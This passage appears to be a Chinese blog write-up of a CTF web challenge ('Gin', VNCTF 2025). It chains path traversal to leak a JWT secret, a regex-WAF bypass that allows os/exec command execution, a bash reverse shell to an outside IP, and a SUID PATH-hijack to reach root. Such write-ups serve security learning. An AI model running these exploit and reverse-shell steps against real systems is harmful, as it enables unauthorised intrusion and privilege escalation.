+<p>是LamentXU最爱的纯白盒审计题。</p>
+<p>首先很明显就能看到一个路径穿越，有一个任意下载的洞：</p>
+<p><img src="/images/migrated/18705991/08.png"></p>
+<p>显然，我们可以通过&#x2F;download?filename&#x3D;..&#x2F;config&#x2F;key.go拿到jwt的secret和time。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package config</span><br><span class="line"></span><br><span class="line">func Key() string &#123;</span><br><span class="line">	return &quot;r00t32l&quot;</span><br><span class="line">&#125;</span><br><span class="line">func Year() int64 &#123;</span><br><span class="line">	return 2025</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着去看jwt的部分。</p>
+<p><img src="/images/migrated/18705991/09.png"></p>
+<p>拿到生成密钥的逻辑。我们整个在线go环境跑一遍：<a target="_blank" rel="noopener" href="https://www.jyshare.com/compile/21/">https://www.jyshare.com/compile/21/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line">import &quot;math/rand&quot;</span><br><span class="line"></span><br><span class="line">func GenerateKey() string &#123;</span><br><span class="line">	rand.Seed(2025)</span><br><span class="line">	randomNumber := rand.Intn(1000)</span><br><span class="line">	key := fmt.Sprintf(&quot;%03d%s&quot;, randomNumber, &quot;r00t32l&quot;)</span><br><span class="line">	return key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   fmt.Println(GenerateKey())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18705991/10.png"></p>
+<p>拿到key。</p>
+<p>接下来就是RCE部分。基本上就是任意RCE，waf如下：</p>
+<p><img src="/images/migrated/18705991/11.png"></p>
+<p>不允许你导入os&#x2F;exec。然而，这里的正则表达式只匹配第一个import，令人忍俊不禁。</p>
+<p>传入code为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">import (</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	cmd := exec.Command(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;ls&quot;)</span><br><span class="line">	out, err := cmd.CombinedOutput()</span><br><span class="line">    fmt.Println(out)</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行。</p>
+<p>直接<code>cat /flag</code></p>
+<p>发现输出<code>VNCTF2025!!!</code>。假flag（我可*你的吧）。</p>
+<p>接下来就是提权</p>
+<p>看root权限的文件：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="/images/migrated/18705991/12.png"></p>
+<p>可以看到有一个&#x2F;…&#x2F;Cat意义不明。</p>
+<p>利用下载key.go的同款方法下载Cat。我们尝试将Cat利用cp命令复制到web目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /.../Cat Cat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18705991/13.png"></p>
+<p>随后&#x2F;download?filename&#x3D;..&#x2F;Cat</p>
+<p>IDA逆向，如下：</p>
+<p><img src="/images/migrated/18705991/14.png"></p>
+<p>发现这里是用的<code>cat /flag</code>而不是<code>/bin/cat /flag</code>。可以环境变量劫持。</p>
+<p>（然后比赛结束了，大哭）</p>
+<p>有点麻烦，先弹个shell吧。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line"> &quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">import (</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">cmd := exec.Command(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/101.43.48.199/13311 0&gt;&amp;1&quot;)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"> fmt.Println(out)</span><br><span class="line"> fmt.Println(err) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意！！！不要bp发包，用浏览器直接发！！！这破地方坑死我了，要不是我一直用bp我不会卡这么久。</p>
+<p><img src="/images/migrated/18705991/15.png"></p>
+<p><img src="/images/migrated/18705991/16.png"></p>
+<p>&#x2F;tmp目录可写，直接写一个&#x2F;tmp&#x2F;cat然后把PATH改过去，这样他在cat &#x2F;flag的时候执行的就是我们&#x2F;tmp下的那个cat脚本。</p>
+<p>我们直接写个shell进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash&#x27; &gt; /tmp/cat</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /tmp/cat </span><br></pre></td></tr></table></figure>
+
+<p>导入到环境变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>然后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/.../Cat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18705991/17.png"></p>
+<p>劫持成功~</p>
+<p>读取&#x2F;root下的flag（不能用cat，cat被劫持了，可以用&#x2F;bin&#x2F;cat）</p>
+<p><img src="/images/migrated/18705991/18.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="toc-number">1.</span> <span class="toc-text">奶龙回家</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">学生姓名登记系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaGuide"><span class="toc-number">3.</span> <span class="toc-text">JavaGuide</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gin"><span class="toc-number">4.</span> <span class="toc-text">Gin</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&text=VNCTF 2025 web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&is_video=false&description=VNCTF 2025 web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VNCTF 2025 web wp&body=Check out this article: https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&name=VNCTF 2025 web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&t=VNCTF 2025 web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
